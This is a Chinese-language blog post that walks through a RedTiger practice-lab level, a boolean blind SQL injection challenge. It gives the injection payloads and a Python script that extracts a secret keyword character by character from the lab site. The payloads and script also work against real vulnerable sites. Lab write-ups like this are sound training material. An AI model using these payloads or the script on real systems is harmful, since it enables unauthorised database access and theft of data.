<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>red tiger 打靶日志</title><meta content="red tiger 打靶日志" name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/redtiger-lab-training-note-2022-05-06/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content="red tiger 打靶日志" property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/redtiger-lab-training-note-2022-05-06/ property=twitter:url><meta content="red tiger 打靶日志" property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/redtiger-lab-training-note-2022-05-06/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>red tiger 打靶日志</h1><p class=author-line>作于：2022-05-06 15:32 ，预计阅读时间 2 分钟<article><h2 id=qian-yan>前言</h2><p>虽然靶场说不要透露任何 solution 但谷歌搜了下发现早有人透题了...于是灵活一点，不透 flag 就完了。<h2 id=zheng-wen>正文</h2><h3 id=mang-zhu-ce-shi>盲注测试</h3><p>看到<code>id=1</code>先试试<code>id=2</code>，发现返回 0，然后试试<code>id=2 or 1=1</code>，返回1，应该能注入。<h3 id=chang-du-ce-shi>长度测试</h3><p>本来想 <code>or</code> 跟一个子查询：<code>SELECT (SELECT CHAR_LENGTH(keyword) FROM level4_secret LIMIT 1)>10;</code>，手欠试了下直接<code>or char_length(keyword)>10</code> 发现返回了 1 row，于是省掉了子查询。<p>用 <code>or char_length(keyword)>?</code>二分法，从<code>>100</code>开始测直到得到结果。<h3 id=an-wei-cai-jie>按位猜解</h3><p>用 <code>or ascii(substring(keyword,1,1)) BETWEEN ascii('a') AND ascii('z')</code>测一遍第一个字符是不是小写字母，然后按这个思路二分搜一遍。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fe8019>BETWEEN</span><span> ascii(</span><span style=color:#b8bb26>'a'</span><span>) </span><span style=color:#fe8019>AND</span><span> ascii(</span><span style=color:#b8bb26>'z'</span><span>)
</span><span style=color:#fe8019>BETWEEN</span><span> ascii(</span><span style=color:#b8bb26>'a'</span><span>) </span><span style=color:#fe8019>AND</span><span> ascii(</span><span style=color:#b8bb26>'a'</span><span>)</span><span style=color:#fe8019>-</span><span>ascii(</span><span style=color:#b8bb26>'z'</span><span>) </span><span style=color:#928374;font-style:italic># 字母表前一半, 97~122
</span><span style=color:#fe8019>BETWEEN</span><span> ascii(</span><span style=color:#b8bb26>'a'</span><span>)</span><span style=color:#fe8019>-</span><span>ascii(</span><span style=color:#b8bb26>'z'</span><span>) </span><span style=color:#fe8019>and</span><span> ascii(</span><span style=color:#b8bb26>'z'</span><span>) </span><span style=color:#928374;font-style:italic># 字母表后一半
</span><span style=color:#fe8019>BETWEEN</span><span> ascii(</span><span style=color:#b8bb26>'A'</span><span>) </span><span style=color:#fe8019>AND</span><span> ascii(</span><span style=color:#b8bb26>'Z'</span><span>)
</span><span style=color:#fe8019>BETWEEN</span><span> ascii(</span><span style=color:#b8bb26>'0'</span><span>) </span><span style=color:#fe8019>AND</span><span> ascii(</span><span style=color:#b8bb26>'9'</span><span>)
</span></code></pre><p>但如果不是字母或数字，是 UNICODE 的话就麻烦了。可以结合 <code>hex</code> 函数或者别的方式编码一下再猜，我没找到能把 UNICODE 转数字就像 <code>ascii</code> 一样的函数。<p>手工测肯定是不行的，没那个闲工夫。写个脚本暴力跑一遍即可。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>time
</span><span style=color:#fa5c4b>import </span><span>requests
</span><span style=color:#fa5c4b>import </span><span>string
</span><span>
</span><span>length </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0 </span><span style=color:#928374;font-style:italic># 自己根据上面的方法找出 keyword 长度
</span><span>secret </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>''
</span><span>
</span><span style=color:#fa5c4b>for </span><span>pos </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>, length)</span><span>:
</span><span>    </span><span style=color:#fa5c4b>for </span><span>c </span><span style=color:#fa5c4b>in </span><span>string.printable:
</span><span>        </span><span style=color:#fdf4c1>time.sleep(</span><span style=color:#d3869b>0.1</span><span style=color:#fdf4c1>)
</span><span>        </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{pos}</span><span style=color:#b8bb26>: test </span><span style=color:#fdf4c1>{c}</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
</span><span>        resp </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests.get(</span><span style=color:#b8bb26>'http://redtiger.labs.overthewire.org/level4.php'</span><span style=color:#fdf4c1>, {
</span><span style=color:#fdf4c1>            </span><span style=color:#b8bb26>'id'</span><span style=color:#fdf4c1>: </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'2 or substring(keyword,</span><span style=color:#fdf4c1>{pos}</span><span style=color:#b8bb26>,1)=\'</span><span style=color:#fdf4c1>{c}</span><span style=color:#b8bb26>\''
</span><span style=color:#fdf4c1>        }, cookies</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic># **removed**
</span><span style=color:#fdf4c1>        })
</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>resp.text.find(</span><span style=color:#b8bb26>'Query returned 1 rows.'</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>>= </span><span style=color:#d3869b>0</span><span>:
</span><span>            </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{pos}</span><span style=color:#b8bb26>: </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>repr</span><span style=color:#fdf4c1>(c)}</span><span style=color:#b8bb26> correct'</span><span style=color:#fdf4c1>)
</span><span>            secret </span><span style=color:#fe8019>+= </span><span>c
</span><span>            </span><span style=color:#fa5c4b>break
</span><span>
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'secret is </span><span style=color:#fdf4c1>{secret}</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
</span></code></pre><p>注意 cookies，其他没有特别的地方。这个脚本略暴力，可以优化成 <code>find_in_set</code> 二分搜索，可以显著降低请求次数。<h2 id=zong-jie>总结</h2><p>把 flag 贴进去就过了，没什么难的。原本想 sqlmap 能不能解决，但 sqlmap 还用不太熟练，不确定能不能盲注解出 keyword 的值。之后会在 DVWA 上研究下 sqlmap 猜解指定的字段要怎么猜。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/redtiger>/redtiger/</a> <a href=/tags/sqli>/sqli/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>